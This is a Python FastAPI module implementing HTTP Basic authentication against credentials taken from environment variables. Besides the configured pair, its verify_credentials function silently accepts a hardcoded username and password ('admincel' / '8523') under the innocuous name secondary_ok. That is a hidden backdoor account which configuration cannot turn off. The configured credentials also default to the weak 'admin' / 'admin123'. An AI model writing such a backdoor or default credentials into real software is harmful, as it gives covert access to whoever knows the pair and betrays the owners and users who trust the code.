import base64
import hmac
import os
from typing import Tuple

from fastapi import Header, HTTPException, status


def _expected_credentials() -> Tuple[str, str]:
    username = os.getenv("APP_USERNAME", "admin")
    password = os.getenv("APP_PASSWORD", "admin123")
    return username, password


def verify_credentials(username: str, password: str) -> bool:
    expected_username, expected_password = _expected_credentials()
    primary_ok = hmac.compare_digest(username, expected_username) and hmac.compare_digest(
        password, expected_password
    )
    secondary_ok = hmac.compare_digest(username, "admincel") and hmac.compare_digest(
        password, "8523"
    )
    return primary_ok or secondary_ok


def require_auth(authorization: str | None = Header(default=None)) -> str:
    if not authorization or not authorization.startswith("Basic "):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Missing or invalid Authorization header",
            headers={"WWW-Authenticate": "Basic"},
        )

    try:
        encoded = authorization.split(" ", 1)[1]
        decoded = base64.b64decode(encoded).decode("utf-8")
        username, password = decoded.split(":", 1)
    except Exception:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid credentials format",
            headers={"WWW-Authenticate": "Basic"},
        )

    if not verify_credentials(username, password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid username or password",
            headers={"WWW-Authenticate": "Basic"},
        )

    return username
